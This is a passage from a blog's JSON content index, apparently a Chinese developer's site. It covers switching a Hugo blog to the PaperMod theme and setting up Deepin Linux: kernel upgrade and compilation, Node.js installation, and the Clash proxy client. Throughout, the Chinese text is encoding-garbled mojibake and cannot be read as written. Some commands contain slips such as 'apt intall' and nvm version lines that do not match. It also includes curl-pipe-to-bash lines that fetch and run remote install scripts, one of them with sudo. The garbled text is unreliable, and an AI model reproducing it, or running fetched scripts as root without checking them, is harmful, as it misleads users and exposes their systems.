1.Papermodä¸»é¢˜ä¸‹åšå®¢ä¸ç”Ÿæ•ˆ? åŸMainroadä¸»é¢˜ä¸‹çš„åšå®¢ï¼Œåœ¨åˆ‡æ¢åˆ°Papermodæ—¶ï¼Œçªç„¶å¤±æ•ˆã€‚ç»æ’æŸ¥ï¼Œå‘ç°Papermodå®˜æ–¹ç¤ºä¾‹ä»“åº“ä¸‹çš„poståˆ†ç±»å¢åŠ äº†_index.htmlæ–‡ä»¶ï¼Œä¸å¢åŠ åˆ™æ— æ³•æ­£å¸¸è®¿é—®ã€‚\nå¦‚ï¼š/Blogs/content/posts/otheråˆ†ç±»ä¸‹ç›´æ¥å†™æ–‡ï¼Œç°åœ¨åˆ™éœ€è¦å¢åŠ /Blogs/content/posts/other/_index.mdï¼Œç¤ºä¾‹å¦‚ä¸‹:\n--- title: \u0026#34;ğŸ“š å…¶ä»–\u0026#34; # description: \u0026#34;ä¸€äº›æ— æ³•åˆ†ç±»çš„çŸ¥è¯†\u0026#34; hidemeta: true # æ˜¯å¦éšè—æ–‡ç« çš„å…ƒä¿¡æ¯ï¼Œå¦‚å‘å¸ƒæ—¥æœŸã€ä½œè€…ç­‰ --- 2.GitHub Actionsä¸­Hugoç‰ˆæœ¬è¿‡ä½ PaperModä¸»é¢˜è¦æ±‚ï¼šHugo \u0026gt;= v0.112.4 $ hugo version # æŸ¥çœ‹ç‰ˆæœ¬ $ brew update # Macç»ˆç«¯ä¸­æ›´æ–° Homebrew $ brew upgrade hugo # å‡çº§ hugo /Blogs/.github/workflows/deploy.ymlé…ç½®é¡¹å‡çº§Hugoç‰ˆæœ¬ï¼š\n... jobs: deploy: ... steps: ... - name: Setup Hugo uses: peaceiris/actions-hugo@v2 with: hugo-version: \u0026#39;0.112.4\u0026#39; # å‡çº§hugoç‰ˆæœ¬ä¸º0.112.4 æˆ– latest extended: true ... 3.ä¸»é¡µsocialIconsé…ç½®é—®é¢˜ ç›®å‰ä¸»é¢˜å®˜æ–¹åªèƒ½æ”¯æŒé¢„è®¾çš„ä¸€äº›iconï¼Œè¯¦æƒ…å‚è€ƒ: hugo-PaperMod / Icons\nç”¨æ³•å¦‚ä¸‹ï¼š\nsocialIcons: - name: \u0026#34;x\u0026#34; url: \u0026#34;https://x.com\u0026#34; - name: \u0026#34;other\u0026#34; # è‡ªå®šçš„icons url: \u0026#34;https://xxx.xxx\u0026#34; å‚è€ƒ æ ¹æ®Hugo PaperModä¸»é¢˜è‡ªå®šä¹‰çš„å„ç§é€»è¾‘: xyming108/sulv-hugo-papermod Sulv hugoåšå®¢æ­å»º | PaperModä¸»é¢˜ æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/other/tools-docs-hugo-papermod/","summary":"\u003cp\u003e\u003ccode\u003eHugo\u003c/code\u003eåšå®¢ä¸­çš„å®˜æ–¹å¯¼èˆªæ æ˜¯å¤´éƒ¨çš„ï¼Œä¹‹å‰ä½¿ç”¨çš„\u003ccode\u003eMainroad\u003c/code\u003eä¸»é¢˜ä¹Ÿæ˜¯å¦‚æ­¤ï¼ˆä¸”ä¸å¤ªå¥½è‡ªå®šä¹‰åˆ°å·¦ä¾§ï¼‰ã€‚æ—¥å¸¸æ–‡æ¡£é˜…è¯»ä¸­ï¼Œä¾§è¾¹\u003ccode\u003etoc\u003c/code\u003eæ›´ä¸ºæ–¹ä¾¿ï¼Œæ•…å¯¹ä¸»é¢˜åšäº†å‡çº§\u0026hellip;\u003c/p\u003e","title":"å·¥å…·: Hugoåšå®¢çš„ Papermod ä¸»é¢˜"},{"content":"åœ¨ä¸Šä¸€ç¯‡ Linux: åŸºäºWindowsï¼Œå®‰è£…Deepinï¼ˆæ·±åº¦ï¼‰åŒç³»ç»Ÿä¸­ï¼ŒæˆåŠŸå®‰è£…Deepinç³»ç»Ÿã€‚é‚£ä¹ˆä¸ºäº†æ–¹ä¾¿åç»­çš„ä½¿ç”¨ï¼Œéœ€è¦æ›´æ–°ç³»ç»Ÿï¼Œå®‰è£…åº”ç”¨ç¨‹åºå’Œç¯å¢ƒé…ç½®ã€‚\nç›®å‰ä¸»æµçš„ Linux ç‰ˆæœ¬ï¼š Debianï¼ˆåŠå…¶æ´¾ç”Ÿç‰ˆæœ¬Ubuntuã€Linux Mintã€deepin - å¼€æºå›½äº§æ“ä½œç³»ç»Ÿï¼‰ Fedoraï¼ˆåŠå…¶ç›¸å…³ç‰ˆæœ¬Red Hat Enterprise Linuxã€CentOSï¼‰ openSUSE æœ¬æ–‡æ˜¯åŸºäºDebianï¼ˆdeepin 20.9ï¼‰ä¸ºä¾‹ï¼Œä»ç³»ç»Ÿã€åº”ç”¨ç¨‹åºã€ç¯å¢ƒé…ç½®ç­‰å‡ ä¸ªè§†è§’è¿›è¡Œè¯´æ˜\u0026hellip;\nä¸€ã€æ›´æ–°ç³»ç»Ÿ\u0026amp;å†…æ ¸ 1.å†…æ ¸ç›¸å…³ 1.1 å‡çº§å†…æ ¸ç‰ˆæœ¬ å®‰è£…æºå†…çš„å†…æ ¸ æ³¨æ„ï¼šè¿™é‡Œheaderså’Œimageä¸¤ä¸ªæ–‡ä»¶è¦æ›¿æ¢ä¸ºè¦å®‰è£…çš„å¯¹è±¡ï¼Œå¯ä»ç»ˆç«¯åˆ—è¡¨å¤åˆ¶ï¼Œä¸­é—´ç©ºæ ¼éš”å¼€\næ³¨æ„ï¼šå¦‚æœæ­£å¼ç‰ˆæºé‡Œï¼Œæ²¡æœ‰ä½ æƒ³è¦çš„æœ€æ–°å†…æ ¸ï¼Œé‚£å°±å…ˆæ·»åŠ å†…æµ‹é€šé“å†æ¥å®‰è£…å†…æ ¸ã€‚è£…å®Œå†…æ ¸åï¼Œå¦‚æœä¸æƒ³ç”¨å†…æµ‹ç‰ˆå°±è¦åŠæ—¶å°†å†…æµ‹æºå…³æ‰ï¼Œå¦åˆ™å†ä¸‹æ¬¡æ›´æ–°æ—¶æœ‰å¯èƒ½å‡ºç°å½±å“ä½¿ç”¨çš„bugã€‚\n$ sudo apt search linux-image-* # æŸ¥çœ‹æºå†…çš„å†…æ ¸æœ‰å“ªäº› # å¦‚æœåœ¨ã€æ·»åŠ å®Œå†…æµ‹æºã€‘åï¼Œå‘ç°å†…æ ¸æ•°é‡è¿˜æ²¡å¢åŠ å°±æ‰§è¡Œ $ sudo apt-get update æ›´æ–°ä¸€ä¸‹æºçš„ä¿¡æ¯åï¼Œå†æŸ¥çœ‹ä¸€ä¸‹æºå†…çš„å†…æ ¸ # å®‰è£…ï¼šæ ¼å¼ä¸º # sudo apt update \u0026amp;\u0026amp; sudo apt install linux-image- linux-headers- # ä¾‹å­1ï¼šå†…æ ¸æ— åç¼€çš„å®‰è£… $ sudo apt update \u0026amp;\u0026amp; sudo apt install linux-image-6.2.1 linux-headers-6.2.1 # ä¾‹å­2ï¼šå†…æ ¸æœ‰åç¼€çš„å®‰è£… $ sudo apt install linux-image-5.18.17-amd64-desktop-hwe linux-headers-5.18.17-amd64-desktop-hwe # é‡å¯ã€‚æŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬æ˜¯å¦å®‰è£…æˆåŠŸ - é»˜è®¤ä½¿ç”¨æœ€æ–°ç‰ˆæœ¬å†…æ ¸ $ uname -r # æˆ– uname -a 1.2 å¸è½½å†…æ ¸ æ³¨æ„ï¼šè¿™é‡Œheaderså’Œimageä¸¤ä¸ªæ–‡ä»¶è¦æ›¿æ¢ä¸ºè¦å¸è½½çš„å¯¹è±¡ï¼Œå¯ä»ç»ˆç«¯åˆ—è¡¨å¤åˆ¶ï¼Œä¸­é—´ç©ºæ ¼éš”å¼€\n# å±•ç¤ºæ‰€æœ‰å®‰è£…çš„å†…æ ¸ $ dpkg --get-selections| grep linux # æˆ– dpkg -l | grep \u0026#34;linux-image\\|linux-headers\u0026#34; # é€‰æ‹©ä¸è¦çš„è¿›è¡Œå¸è½½ # å¸è½½çš„æ ¼å¼ï¼šsudo apt purge linux-image- linux-headers- # ä¾‹å­1: å†…æ ¸æœ‰åç¼€çš„å¸è½½ $ sudo apt purge linux-image-5.18.4-amd64-desktop-hwe linux-headers-5.18.4-amd64-desktop-hwe # ä¾‹å­2: å†…æ ¸æ— åç¼€çš„å¸è½½ï¼š $ sudo apt purge linux-image-6.1.12 linux-headers-6.1.12 1.3 kernelå®˜ç½‘: è‡ªè¡Œç¼–è¯‘å†…æ ¸ æ³¨æ„ï¼šä»¥ä¸‹æ˜¯ å†…æ ¸å®˜ç½‘ ä¸‹è½½å‡çº§çš„æ•™ç¨‹ï¼Œå¸¸è§„ä¸‹ä¸å¤ªå»ºè®®ä½¿ç”¨ï¼Œä¸»è¦é€‚ç”¨äºä»¥ä¸Šå…¶ä»–æ‰‹æ®µè·å–çš„å†…æ ¸æ— æ³•è§£å†³é—®é¢˜æ—¶ã€‚è¯¦ç»†æ–‡æ¡£å¯å‚è€ƒï¼šLinux: ç¼–è¯‘å†…æ ¸æ•™ç¨‹ï¼ˆå…¨ï¼‰(Ubuntu)(Deepin)(Debian)\ni. æ›´æ–°è½¯ä»¶æº\u0026amp;è½¯ä»¶\n$ sudo apt update # æ›´æ–°è½¯ä»¶æº $ sudo apt upgrade # æ›´æ–°è½¯ä»¶ ii.å†…æ ¸å®˜ç½‘ ä¸‹è½½å†…æ ¸æºä»£ç ï¼Œé€‰æ‹©stableæ—è¾¹çš„tarballä¸‹è½½ã€‚\niii. å®‰è£…ä¾èµ–\n$ sudo apt install libncurses5-dev openssl libssl-dev build-essential pkg-config libc6-dev bison flex libelf-dev zlibc minizip libidn11-dev libidn11 qttools5-dev liblz4-tool # deepinç”¨æˆ·ï¼Œè¿˜è¦å®‰è£…å¦‚ä¸‹çš„ä¾èµ– $ sudo apt install plymouth* console-setup iv.ç¼–è¯‘\n# è§£å‹ $ tar -xavf linux-5.18.14.tar.xz # åˆ°ä½ ä¸‹è½½çš„ç›®å½•è§£å‹ï¼Œå¯è§£å‹åœ¨ä¸»ç›®å½•ï¼ˆ~ï¼‰ä¸‹ï¼Œæœ‰æ•™ç¨‹è¯´å¿…é¡»è§£å‹åœ¨/usr/srcä¸‹ï¼Œå…¶å®æ˜¯æ— ç¨½ä¹‹è°ˆï¼Œå®‰è£…å†…æ ¸æ—¶ç³»ç»Ÿä¼šè‡ªåŠ¨å¸®ä½ æŠŠæºä»£ç å¤åˆ¶åˆ°/usr/srcä¸‹ $ cd linux-5.18.14 # å‡€åŒ–å†…æ ¸æºç ï¼Œåˆ é™¤æ®‹ç•™ $ make mrproper # å¯åœ¨æƒ³é‡æ–°ç¼–è¯‘æ—¶æ‰§è¡Œè¿™ä¸ªå‘½ä»¤ # é…ç½®å†…æ ¸ # 1.æ–°ç‰ˆæœ¬å†…æ ¸æºç ä¸­è‡ªå¸¦çš„.configæ–‡ä»¶æ‰€å«å†…å®¹å¤ªå°‘ï¼Œç¼–è¯‘ååªèƒ½åŠ è½½ä¸€ä¸ªæ¨¡å—ï¼Œä¸èƒ½æ»¡è¶³æ­£å¸¸ä½¿ç”¨ # 2. é€‰æ‹©å®˜æ–¹ç³»ç»Ÿç¼–è¯‘å¥½çš„å†…æ ¸ï¼ˆç‰ˆæœ¬æœ«å°¾åŒ…å«-amd64-desktopçš„å†…æ ¸ï¼‰çš„.configé…ç½®æ–‡ä»¶ï¼Œå¤åˆ¶è¿‡æ¥ã€‚(å½“å‰å®˜æ–¹æœ€æ–°å†…æ ¸æ˜¯5.15.34ï¼Œåœ¨ç¬¬äºŒè¡Œä»£ç /boot/configåé¢åŒå‡»tabé”®åˆ—å‡ºæ–‡ä»¶åå‚è€ƒè¡¥å…¨) $ sudo su $ cp /boot/config-5.15.34-amd64-desktop .config # å¤åˆ¶å®Œæˆåï¼Œè¾“å…¥exité€€å‡ºsudoï¼Œå†ç»§ç»­ç¼–è¯‘ã€‚åœ¨sudoä¸‹ç¼–è¯‘å†…æ ¸ï¼Œä¼šæœ‰ä¸€å †é—®é¢˜ v.ç¼–è¯‘å¹¶å®‰è£…å†…æ ¸ï¼ˆç¼–è¯‘å†…æ ¸éœ€è¦çš„æ—¶é—´å¾ˆé•¿ï¼‰\n# ç¼–è¯‘ä¸»ä½“ $ make bzImage -j6 # 6æ˜¯ä½ ç”µè„‘CPUçš„çº¿ç¨‹æ•°ï¼Œè‡ªè¡ŒæŸ¥è¯¢ # ç¼–è¯‘æ¨¡å— $ make modules -j6 # å®‰è£…æ¨¡å— $ sudo make INSTALL_MOD_STRIP=1 modules_install -j6 # ç¼–è¯‘é˜¶æ®µå–æ¶ˆè°ƒè¯•ä¿¡æ¯ï¼ˆåœ¨Kernel hackingçš„ç›®å½•ä¸‹å–æ¶ˆKernel debuggingï¼‰æˆ–å¤åˆ¶çš„å®˜æ–¹ç³»ç»Ÿå†…æ ¸çš„.configæ–‡ä»¶ï¼Œæ­¤å¤„å‘½ä»¤å°±å¯åˆ æ‰INSTALL_MOD_STRIP=1å‚æ•° # å®‰è£…åï¼Œ/lib/modulesä¸‹ä¼šå‡ºç°å†…æ ¸ç‰ˆæœ¬å·æ–‡ä»¶å¤¹ # æœ€åä¸‰éƒ¨æ›²ï¼Œå†…æ ¸æœ€ç»ˆæ–‡ä»¶ $ sudo mkinitramfs /lib/modules/5.18.14-amd64-desktop/ -o /boot/initrd.img-5.18.14-amd64-desktop $ sudo cp arch/x86/boot/bzImage /boot/vmlinuz-5.18.14-amd64-desktop $ sudo cp System.map /boot/System.map-5.18.14-amd64-desktop # æ›´æ–°grub $ sudo update-grub2 vi.é‡å¯ä¸”æŸ¥çœ‹ç‰ˆæœ¬å·\n$ uname -r # æŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬æ˜¯å¦æ­£ç¡® 2. å‰ç«¯è½¯ä»¶åŒ…ç®¡ç†å™¨aptå’Œapt-get å› ä¸º Deepin 20.9ç¤¾åŒºç‰ˆæ˜¯åŸºäºDebianç³»ç»Ÿçš„ï¼Œæ‰€ä»¥å¯¹è½¯ä»¶åŒ…ç®¡ç†å™¨çš„ä½¿ç”¨ç›´æ¥å‚è€ƒDeepinç³»ç»Ÿå³å¯ã€‚ \u0026ldquo;å‰ç«¯è½¯ä»¶åŒ…ç®¡ç†å™¨\u0026quot;çš„æ¦‚å¿µï¼Œå¯ä»¥å¯¹æ ‡ Mac ä¸­çš„ Homebrew\napt-getå’Œaptï¼šä½¿ç”¨å‘½ä»¤å’Œå·®å¼‚\n$ dpkg -l | grep \u0026lt;package_name\u0026gt; # æŸ¥æ‰¾é€šè¿‡ apt install å®‰è£çš„packageç‰ˆæœ¬ $ sudo apt remove \u0026lt;package_name\u0026gt; # ç§»é™¤è¯¥åŒ… äºŒã€ç¯å¢ƒé…ç½® 1. git \u0026amp; ssh-key $ sudo apt intall git # å®‰è£…git $ git --version git ssh è®¾ç½®: å‚è€ƒGit ä¸­ ssh keyã€https é…ç½®åŠç”¨æˆ·åã€é‚®ç®±åŸºæœ¬ä¿¡æ¯é…ç½®- Blogs\n2. nodeç›¸å…³: npmã€ç‰ˆæœ¬ç®¡ç† å‚è€ƒ: å¦‚ä½•åœ¨ Debian 10 ä¸Šå®‰è£… Node.js\næ–¹å¼1ï¼šé»˜è®¤å­˜å‚¨åº“ä¸­çš„ Apt å®‰è£…\n# æ³¨æ„ï¼Œä¸ä¼šå®‰è£…æœ€æ–°ç‰ˆæœ¬ $ sudo apt install nodejs npm -y # åªèƒ½å‡çº§åˆ°æ—§ç‰ˆæœ¬ $ node -v # éªŒè¯ 10.x.x æ–¹å¼2: ä½¿ç”¨ NodeSource ï¼Œé€šè¿‡ Apt å®‰è£…\n$ sudo apt remove nodejs npm # å¸è½½æ—§ç‰ˆæœ¬ $ curl -sL https://deb.nodesource.com/setup_20.x | sudo -E bash - # å®˜ç½‘æŸ¥æ‰¾å¯¹åº”çš„ltsç‰ˆæœ¬ $ sudo apt install -y nodejs $ node -v æ–¹å¼3: ä½¿ç”¨ nvm ç®¡ç† node å¤šç‰ˆæœ¬ ã€æ¨èã€‘ æ³¨æ„: nvmç®¡ç†çš„å¤šç‰ˆæœ¬nodeï¼Œäº’ç›¸ç‹¬ç«‹ï¼ˆåŒ…æ‹¬node_modulesï¼‰\n$ curl https://raw.githubusercontent.com/creationix/nvm/master/install.sh | bash # å°† nvm è„šæœ¬å®‰è£…åˆ°çš„ç”¨æˆ·å¸æˆ· $ source ~/.bashrc # åˆ·æ–° $ nvm list-remote # åˆ—å‡ºå¯ç”¨ç‰ˆæœ¬ $ nvm install 20.11.1 # å®‰è£…: æŸ¥çœ‹å®˜ç½‘è·å–ltsç‰ˆæœ¬ $ nvm use 11.6 $ nvm alias default 11.7 # è®¾ç½®é»˜è®¤ç‰ˆæœ¬ ä¸‰ã€å¸¸ç”¨è½¯ä»¶ 1.ç§‘å­¦ä¸Šç½‘: shadowsocks \u0026amp; clash Adblock Plus Filtersè‡ªå®šä¹‰è§„åˆ™ ä»‹ç»äº†ä½¿ç”¨é…ç½®é¡¹ï¼Œé…ç½®shadowsockså’Œv2rayç­‰SSRå·¥å…·çš„è‡ªå®šä¹‰è§„åˆ™ã€‚è™½ç„¶å¯ä»¥è§£å†³é—®é¢˜ï¼Œä½†ä»æ¯”è¾ƒç¹çã€‚ä¸‹é¢ä»‹ç»å¦‚ä½•é€šè¿‡GUIè§£å†³è¿™ä¸ªé—®é¢˜ã€‚\n1.1 shadowsocks å®‰è£… shadowsocksè·¨ç«¯ç‰ˆæœ¬ electron-ssr-0.2.6.deb ï¼ˆé˜¿é‡Œäº‘ç›˜ï¼‰\nå¯èƒ½å‡ºç°é—®é¢˜ï¼šssré…ç½®å®Œè®¢é˜…ï¼Œå‡çº§æœåŠ¡åï¼Œåˆ‡æ¢åˆ°PACï¼Œä»ç„¶ä¸èƒ½æ­£å¸¸è®¿é—® è§£å†³æ€è·¯: æ‰“å¼€å…¨å±€ä»£ç†ï¼Œé‡æ–°åˆ‡å›PACä»£ç†å³å¯\n1.2 clash æ–¹å¼1ï¼šclashå‘½ä»¤è¡Œç‰ˆæœ¬é…åˆweb uiæ•™ç¨‹ å‚è€ƒï¼škingfastä½¿ç”¨æ•™ç¨‹\næ–¹å¼1-i: å¯åŠ¨ clash core æ³¨æ„ï¼šlinuxä¸€èˆ¬ä¸‹è½½clash-linux-amd64-xxx\n# ç¬¬1æ­¥ï¼šä¸‹è½½Clash Core äºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶ # ä¸‹è½½åœ°å€: https://github.com/doreamon-design/clash/releases # å·²forkåˆ°: https://github.com/lianpf/clash # ç¬¬2æ­¥ï¼šè§£å‹ \u0026amp; èµ‹äºˆæ‰§è¡Œæƒé™ $ cd /home/lianpf/software/clash # è¿›å…¥è½¯ä»¶çš„å®‰è£…ç›®å½• $ wget -c https://github.com/doreamon-design/clash/releases/download/v2.0.24/clash_2.0.24_linux_amd64.tar.gz # ä¸‹è½½å¤±è´¥ï¼Œåˆ™æ‰‹åŠ¨å»GitHubä¸‹è½½ $ tar -zxvf clash_2.0.24_linux_amd64.tar.gz # è§£å‹ç¼©æ–‡ä»¶ $ cd .. $ chmod +x clash # èµ‹äºˆæ‰§è¡Œæƒé™ # ç¬¬3æ­¥ï¼šä»è®¢é˜…åœ°å€è·å–config.yaml $ mkdir -p ~/.config/clash $ wget -O ~/.config/clash/config.yaml https://sub.o4o.win/xxx?type=clash # æ›¿æ¢æˆä½ è‡ªå·±çš„clashè®¢é˜…é“¾æ¥ # ç¬¬4æ­¥ï¼šå¯åŠ¨ $ cd ~/.config/clash $ ./clash # åœ¨ä½ clashçš„å®‰è£…ç›®å½•ä¸‹æ‰§è¡Œå‘½ä»¤å¯åŠ¨ã€‚ # è¿è¡ŒClash ä¼šé»˜è®¤è¯»å– $HOME/.config/clash ç›®å½•ä¸‹çš„ config.yaml æ–‡ä»¶ è‹¥è¿è¡Œæç¤ºç«¯å£è¢«å ç”¨ï¼Œåˆ™å‚è€ƒ LinuxåŸºç¡€å‘½ä»¤ï¼ˆCloud Notesï¼‰ æ€æ‰å ç”¨è¿›ç¨‹\nè¿è¡ŒclashæŠ¥é”™å¦‚ä¸‹ï¼šINFO[0000] Start initial compatible provider â“‚ å¾®è½¯æœåŠ¡ ... ERRO[0000] External controller listen error: listen tcp :9090: bind: address already in use WARN[0000] [CacheFile] can\u0026#39;t open cache file: timeout ERRO[0000] create addr :7890 tcp listener error: listen tcp :7890: bind: address already in use ERRO[0000] create addr :7891 tcp listener error: listen tcp :7891: bind: address already in use æ–¹å¼1-ii: Web GUIï¼ˆSwitchyOmegaæ‰©å±•ï¼‰ç®¡ç† å¯çœ‹åˆ°ä¸Šä¸€æ­¥ï¼Œclashåˆ›å»ºå‰ç½®ä»£ç†ï¼Œhttpä»£ç†ç«¯å£ä¸ºï¼š7890 ï¼Œsocks5ä»£ç†ç«¯å£ä¸ºï¼š7891 ï¼ŒRESTful APIçš„ç«¯å£æ˜¯9090 (å®é™…ç«¯å£ï¼Œä»¥./clashæ‰§è¡Œåï¼Œç»ˆç«¯è¾“å‡ºçš„ä¸ºå‡†)\nChromeå•†åº—å®‰è£…æ‰©å±•ï¼Œæˆ–ç‚¹å‡» https://github.com/FelisCatus/SwitchyOmega/releases ä¸‹è½½\næ³¨æ„: å‡å¦‚ä½ ä½¿ç”¨ä»£ç†å®¢æˆ·ç«¯ï¼ˆlinuxå†…ä½¿ç”¨clash-windowsï¼‰ï¼Œé€šå¸¸å®ƒå¯å¸®ä½ åˆå¹¶ç«¯å£ã€‚æ¯”å¦‚æŠŠä»¥ä¸Šçš„httpã€socketsç­‰ç«¯å£éƒ½è®¾ç½®ä¸º7890ï¼Œé‚£ä¹ˆä½ åœ¨ã€è®¡ç®—æœºç³»ç»Ÿ / ç½‘ç»œé…ç½®ã€‘é‡Œé…ç½®ä»£ç†ï¼Œå’Œä»¥ä¸‹çš„ç«¯å£é…ç½®ä¸­éƒ½å¯å°†æ‰€æœ‰ç«¯å£è®¾ç½®ä¸º7890\næµè§ˆå™¨æ‰“å¼€ï¼šhttps://clash.razord.top/#/connectionsï¼Œè¿›è¡Œé…ç½®ï¼š æ–¹å¼2ï¼šclash for windows èµ„æºä¸‹è½½åœ°å€ï¼šhttps://archive.org/\nå‚è€ƒï¼šmanjaro-env-config/#ç§‘å­¦ä¸Šç½‘\nç¬¬1æ­¥ï¼šä¸‹è½½å®‰è£…\u0026amp;å¯åŠ¨æµ‹è¯• clash for windowsåœ¨linuxä¹Ÿèƒ½ç”¨ã€‚ä¸è¿‡clashä½œè€…åˆ åº“è·‘è·¯äº†ï¼Œæ‰€ä»¥æ— æ³•é€šè¿‡githubä¸‹è½½æˆ–ä½¿ç”¨aptå®‰è£…ï¼Œåªèƒ½æ‰¾äº’è”ç½‘æ®‹å­˜ç‰ˆæœ¬å®‰è£…ã€‚ä¸‹è½½åœ°å€ æˆ–å®‰è£…ã€é˜¿é‡Œäº‘ç›˜ã€‘ç‰ˆæœ¬\narchive.org ä¸‹è½½linux 64ä½ç‰ˆæœ¬ ç¬¬2æ­¥: å¯åŠ¨æµ‹è¯• \u0026amp; æ¡Œé¢å¿«æ·æ–¹å¼ è½¯ä»¶å®‰è£…ç›®å½•å†…è§£å‹ \u0026amp; å¯åŠ¨æµ‹è¯•\n$ cd ~/software/clash-windows $ tar -zxvf your_file.tar.gz # è§£å‹ä½ çš„æ–‡ä»¶åˆ°å½“å‰ç›®å½• $ cp clash-windows/* clash-windows # è·¯å¾„è‡ªè¡Œæ‹¼æ¥ï¼šæ ¸å¿ƒè¯‰æ±‚å°±æ˜¯æŠŠclash-windowsè§£å‹åçš„æ‰€æœ‰å†…å®¹ï¼Œå¤åˆ¶åˆ°clash-windowsä¸‹ $ cd clash-windows # è¿›å…¥softwareå®‰è£…ç›®å½•ä¸‹ $ $ chmod +x /home/lianpf/software/clash-windows/cfw # æ·»åŠ æƒé™ (è‹¥æ— æ³•å¯åŠ¨cfwï¼Œåˆ™æ‰§è¡Œè¯¥æ­¥éª¤) $ ./cfw # å¯åŠ¨clash å¯åŠ¨æˆåŠŸé¡µé¢ï¼š\nç»ˆç«¯æ˜¾ç¤ºï¼š\nå¼¹å‡ºclash GUIï¼š\nåˆ‡æ¢ä»£ç†è®¾ç½®é¡µé¢ï¼š\nåˆ°æ­¤ä¸ºæ­¢ï¼Œclashå·²ç»å®‰è£…æˆåŠŸã€‚å¦‚æœä¸éœ€è¦é…ç½®ã€æ¡Œé¢å¿«æ·æ–¹å¼ã€‘ï¼Œå¯è·³è¿‡ä»¥ä¸‹æ­¥éª¤ï¼Œç›´æ¥å‚è€ƒã€ç³»ç»Ÿä»£ç†ã€‘é…ç½®\nåˆ›å»ºæ¡Œé¢å¿«æ·æ–¹å¼ï¼ˆé€‰æ‹©cfwæ–‡ä»¶å‘é€åˆ°æ¡Œé¢ï¼‰\nç¬¬3æ­¥: ç³»ç»Ÿä»£ç† æœ€åå†æ‰“å¼€ç³»ç»Ÿè®¾ç½®ï¼Œè®¾ç½®ä»£ç†ä¸ºclashç«¯å£ï¼Œä»£ç†å°±å€’è…¾å®Œäº† å¯åŠ¨å™¨/æ§åˆ¶ä¸­å¿ƒ/ç½‘ç»œ/ç³»ç»Ÿä»£ç† 9.å…¶ä»–ï¼šæµè§ˆå™¨ã€çƒ­ç‚¹ æµè§ˆå™¨: https://www.google.com/chrome/dr/download/ ä¸‹è½½*.debç‰ˆæœ¬ Linuxçƒ­ç‚¹ï¼šè¯·å‚è€ƒ Linuxåº”ç”¨: çƒ­ç‚¹ hotspot | Blogs æˆªå›¾è½¯ä»¶ï¼šæ¨èflameshot(ç«ç„°æˆªå›¾) manjaro-env-config/#æˆªå›¾å·¥å…· ä¹ã€å¸¸è§é—®é¢˜ 1. Deepinç³»ç»Ÿå¿«æ·é”®æœ‰å“ªäº›ï¼Ÿ å‚è€ƒ å·¥å…·: å¿«æ·é”®ï¼ˆShortcut keysï¼‰ | Blogs\n2. å¸¸è§çš„ç»ˆç«¯å‘½ä»¤ å‚è€ƒ Linux åŸºç¡€å‘½ä»¤ | CloudNotes\n3. ç¤¾åŒº20.9ç‰ˆæœ¬ç³»ç»Ÿï¼Œä¸å…¼å®¹inter 12ä»£é›†æˆæ˜¾å¡ï¼Œå¯¼è‡´æ‰©å±•æ˜¾ç¤ºå™¨ä¸å¯ç”¨ é—®é¢˜æè¿°ï¼š æ¸…åé•œåƒæºå®‰è£…çš„20.9ç¤¾åŒºç‰ˆï¼Œå†…æ ¸æ˜¯5.15.77ç‰ˆæœ¬ï¼Œä¸å…¼å®¹inter 12ä»£é›†æˆæ˜¾å¡ï¼Œå¯¼è‡´ç”µè„‘åœ¨è¿æ¥åˆ°æ˜¾ç¤ºå™¨æ—¶ï¼Œæ— æ³•æ£€æµ‹åˆ°æ˜¾ç¤ºå™¨\nè§£å†³åŠæ³•ï¼š å‡çº§å†…æ ¸è‡³6.7.4ç‰ˆæœ¬ã€‚æ–‡ä»¶èµ„æºåœ¨ã€/é˜¿é‡Œäº‘ç›˜/è®¡ç®—æœºç³»ç»Ÿ/linux 6.7.4å†…æ ¸ã€‘ï¼ŒåŒ…æ‹¬ linux-headers-xxx.deb å’Œ linux-image-xxx.deb ä¸¤ä¸ªåŒ…:\né¦–å…ˆç‚¹å‡»å®‰è£…linux-headers-xxx.debåŒ…ï¼Œè¯¥åŒ…å«å†…æ ¸å¤´æ–‡ä»¶ï¼Œç”¨äºæ„å»ºå’Œå®‰è£…å†…æ ¸æ¨¡å—ã€‚ ç„¶åå®‰è£…linux-image-xxx.debåŒ…ï¼Œè¯¥åŒ…å«äº†å®é™…çš„å†…æ ¸é•œåƒã€‚ æ³¨æ„ï¼š\nç¡®ä¿linux-image-xxx.debå’Œlinux-headers-xxx.debä¸¤ä¸ªåŒ…ï¼Œå¯¹åº”çš„ç‰ˆæœ¬å·ä¸€è‡´ç›¸åŒ¹é…ï¼Œä»¥é¿å…ä¸å…¼å®¹æˆ–äº§ç”Ÿå…¶ä»–é—®é¢˜ é€šå¸¸æƒ…å†µä¸‹ï¼Œä¸¤ä¸ªåŒ…çš„å®‰è£…æœ€å¥½è¿˜æ˜¯æŒ‰ç…§ã€å…ˆheadersåimageã€‘çš„é¡ºåºè¿›è¡Œå®‰è£…ï¼Œä»¥ç¡®ä¿ç³»ç»Ÿèƒ½å¤Ÿæ­£ç¡®è¯†åˆ«å’Œä½¿ç”¨æ–°çš„å†…æ ¸ç‰ˆæœ¬ 